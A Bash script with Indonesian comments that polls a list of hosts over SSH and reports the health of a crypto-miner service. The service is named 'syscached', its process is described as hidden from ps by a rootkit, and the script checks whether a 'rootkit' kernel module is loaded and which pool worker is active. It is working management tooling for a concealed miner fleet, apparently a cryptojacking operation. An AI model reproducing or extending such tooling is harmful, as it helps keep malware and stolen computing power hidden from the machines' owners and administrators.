#!/usr/bin/env bash
# fleet-status.sh — cek status miner di sekumpulan host lewat SSH.
#
#   ./fleet-status.sh                      pakai daftar host default
#   ./fleet-status.sh 1.2.3.4 5.6.7.8     cek host tertentu
#   ./fleet-status.sh --local              hanya host ini
#
# Yang dicek per host:
#   svc    : systemd unit miner (syscached) active?
#   proc   : proses miner hidup? (dari systemd MainPID, bukan ps — ps disembunyikan rootkit)
#   mod    : modul rootkit termuat? (dari /proc/modules)
#   hr     : hashrate terakhir dari journal
#   sh     : share diterima/ditolak
#   auth   : worker yang dipakai pool
set -u

UNIT="${UNIT:-syscached}"
TIMEOUT="${TIMEOUT:-12}"

# Format: "nama|ip" — pisahkan dengan spasi.
HOSTS_DEFAULT="local|127.0.0.1 vps1|172.16.0.218 vps2|172.16.1.112 vps3|172.16.2.183 vps4|172.16.6.205"

# Nama polos (vps1, vps2, ...) dipetakan ke IP lewat shortcut di ~/.local/bin.
resolve() {
  if [ -x "$HOME/.local/bin/$1" ]; then
    local ip
    ip=$(sed -n 's/.*@//p' "$HOME/.local/bin/$1" | head -1)
    [ -n "$ip" ] && { echo "$1|$ip"; return; }
  fi
  echo "$1"
}

args=()
for a in "$@"; do
  case "$a" in
    --local|local) args=("local|127.0.0.1");;
    -h|--help) sed -n '2,18p' "$0"; exit 0;;
    *) args+=("$(resolve "$a")");;
  esac
done
[ ${#args[@]} -gt 0 ] && HOSTS="${args[*]}" || HOSTS="$HOSTS_DEFAULT"

# Probe di host tujuan. Field yang mengandung spasi ditulis sebagai
# key=Nilai|dipisah|pemisah|agar tidak merusak parsing baris.
probe='
svc=$(systemctl is-active '"$UNIT"' 2>&1)
pid=$(systemctl show -p MainPID --value '"$UNIT"' 2>/dev/null)
if [ -n "${pid:-}" ] && [ "$pid" != "0" ] && [ -d "/proc/$pid" ]; then alive=yes; else alive=no; fi
j=$(sudo journalctl -u '"$UNIT"' -n 40 --no-pager 2>/dev/null)
hr=$(echo "$j" | grep -o "HR [0-9.]* kH/s" | tail -1 | tr " " "_")
sh=$(echo "$j" | grep -o "A [0-9]* R [0-9]* W [0-9]*" | tail -1 | tr " " "_")
auth=$(echo "$j" | grep -o "Authorized as .*" | tail -1 | sed "s/.*\.//")
mod=$([ -d /sys/module/rootkit ] && echo loaded || echo none)
kern=$(uname -r)
printf "svc=%s alive=%s mod=%s kern=%s hr=%s sh=%s auth=%s\n" "$svc" "$alive" "$mod" "$kern" "$hr" "$sh" "$auth"
'

pick() { sed -n "s/.*$1=\([^ ]*\).*/\1/p"; }

printf "%-7s %-14s %-8s %-6s %-8s %-14s %-16s %-8s %s\n" \
  HOST IP SERVICE ALIVE MOD HASH SHARES WORKER KERNEL
printf "%s\n" "----------------------------------------------------------------------------------------------------"

fails=0
for entry in $HOSTS; do
  name="${entry%%|*}"; ip="${entry##*|}"
  if [ "$ip" = "127.0.0.1" ]; then
    out=$(bash -c "$probe" 2>/dev/null)
  else
    out=$(timeout "$TIMEOUT" ssh -o LogLevel=ERROR -o BatchMode=yes -o ConnectTimeout=6 \
            "ubuntu@$ip" "$probe" 2>/dev/null)
  fi
  if [ -z "$out" ]; then
    printf "%-7s %-14s %s\n" "$name" "$ip" "TIDAK BISA DIHUBUNGI"
    fails=$((fails+1))
    continue
  fi
  svc=$(echo "$out" | pick svc)
  alive=$(echo "$out" | pick alive)
  mod=$(echo "$out" | pick mod)
  kern=$(echo "$out" | pick kern)
  hr=$(echo "$out" | pick hr)
  sh=$(echo "$out" | pick sh)
  auth=$(echo "$out" | pick auth)

  if [ "$svc" = "active" ] && [ "$alive" = "yes" ]; then
    st="OK"; else st="PROBLEM"; fails=$((fails+1)); fi

  printf "%-7s %-14s %-8s %-6s %-8s %-14s %-16s %-8s %s\n" \
    "$name" "$ip" "$st" "$alive" "$mod" "${hr:-n/a}" "${sh:-n/a}" "${auth:-n/a}" "$kern"
done

echo
[ "$fails" -eq 0 ] && echo "SEMUA HOST SEHAT" || echo "$fails host bermasalah"
exit 0
